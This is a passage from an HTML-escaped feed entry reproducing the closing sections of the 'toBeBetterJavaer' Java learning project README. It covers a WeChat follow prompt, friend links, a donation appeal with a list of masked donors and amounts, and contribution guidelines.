万+读者关注，微信搜索「&lt;strong&gt;沉默王二&lt;/strong&gt;」（也可以扫描下方的二维码）就可以关注作者了。&lt;/p&gt; &#xA;&lt;div align=&#34;left&#34;&gt; &#xA; &lt;img src=&#34;http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/gongzhonghao.png&#34; width=&#34;260px&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;p&gt;关注后，回复关键字「&lt;strong&gt;00&lt;/strong&gt;」可以获取更多优质的 Java 学习资料。&lt;/p&gt; &#xA;&lt;h3&gt;star趋势图&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://star-history.com/#itwanger/toBeBetterJavaer&amp;amp;Date&#34;&gt;&lt;img src=&#34;https://api.star-history.com/svg?repos=itwanger/toBeBetterJavaer&amp;amp;type=Date&#34; alt=&#34;Star History Chart&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;友情链接&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/acmenlt/dynamic-threadpool&#34;&gt;Hippo4J&lt;/a&gt;，🔥 强大的动态线程池，附带监控报警功能（没有依赖中间件），完全遵循阿里巴巴编码规范。&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Snailclimb/JavaGuide&#34;&gt;JavaGuide&lt;/a&gt;，「Java学习+面试指南」一份涵盖大部分 Java 程序员所需要掌握的核心知识。准备 Java 面试，首选 JavaGuide！&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;捐赠鼓励&lt;/h3&gt; &#xA;&lt;p&gt;开源不易，如果《Java 程序员进阶之路》对你有些帮助，可以请作者喝杯咖啡，算是对开源做出的一点点鼓励吧！&lt;/p&gt; &#xA;&lt;div align=&#34;left&#34;&gt; &#xA; &lt;img src=&#34;http://cdn.tobebetterjavaer.com/tobebetterjavaer/images/weixin-zhifu.png&#34; width=&#34;260px&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;p&gt;&lt;span&gt;💝&lt;/span&gt; 感谢大家对我资金的赞赏，每隔一个月会统计一次。&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;时间&lt;/th&gt; &#xA;   &lt;th&gt;小伙伴&lt;/th&gt; &#xA;   &lt;th&gt;赞赏金额&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-05-12&lt;/td&gt; &#xA;   &lt;td&gt;*烟&lt;/td&gt; &#xA;   &lt;td&gt;10元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-04-25&lt;/td&gt; &#xA;   &lt;td&gt;*思&lt;/td&gt; &#xA;   &lt;td&gt;5元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-04-20&lt;/td&gt; &#xA;   &lt;td&gt;w*n&lt;/td&gt; &#xA;   &lt;td&gt;1元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-04-12&lt;/td&gt; &#xA;   &lt;td&gt;*生&lt;/td&gt; &#xA;   &lt;td&gt;10元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-03-04&lt;/td&gt; &#xA;   &lt;td&gt;袁*波&lt;/td&gt; &#xA;   &lt;td&gt;99元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-02-17&lt;/td&gt; &#xA;   &lt;td&gt;*色&lt;/td&gt; &#xA;   &lt;td&gt;1元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-02-17&lt;/td&gt; &#xA;   &lt;td&gt;M*y&lt;/td&gt; &#xA;   &lt;td&gt;1元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-01-28&lt;/td&gt; &#xA;   &lt;td&gt;G*R&lt;/td&gt; &#xA;   &lt;td&gt;6.6元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-01-20&lt;/td&gt; &#xA;   &lt;td&gt;*光&lt;/td&gt; &#xA;   &lt;td&gt;50元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-01-14&lt;/td&gt; &#xA;   &lt;td&gt;*浩&lt;/td&gt; &#xA;   &lt;td&gt;1元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-01-01&lt;/td&gt; &#xA;   &lt;td&gt;马*谊&lt;/td&gt; &#xA;   &lt;td&gt;6.6元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2022-01-01&lt;/td&gt; &#xA;   &lt;td&gt;刚*好&lt;/td&gt; &#xA;   &lt;td&gt;3.6元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2021-12-20&lt;/td&gt; &#xA;   &lt;td&gt;t*1&lt;/td&gt; &#xA;   &lt;td&gt;5 元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2021-10-26&lt;/td&gt; &#xA;   &lt;td&gt;*鱼&lt;/td&gt; &#xA;   &lt;td&gt;28 元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2021-10-11&lt;/td&gt; &#xA;   &lt;td&gt;*人&lt;/td&gt; &#xA;   &lt;td&gt;28 元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2021-09-01&lt;/td&gt; &#xA;   &lt;td&gt;S*n&lt;/td&gt; &#xA;   &lt;td&gt;6.6 元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2021-08-02&lt;/td&gt; &#xA;   &lt;td&gt;*秒&lt;/td&gt; &#xA;   &lt;td&gt;1 元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2021-06-13&lt;/td&gt; &#xA;   &lt;td&gt;*7&lt;/td&gt; &#xA;   &lt;td&gt;28 元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2021-04-29&lt;/td&gt; &#xA;   &lt;td&gt;p*e&lt;/td&gt; &#xA;   &lt;td&gt;2 元&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;参与贡献&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;如果你对本项目有任何建议或发现文中内容有误的，欢迎提交 issues 进行指正。&lt;/li&gt; &#xA; &lt;li&gt;对于文中我没有涉及到知识点，欢迎提交 PR。&lt;/li&gt; &#xA;&lt;/ol&gt;</summary>
  </entry>
</feed>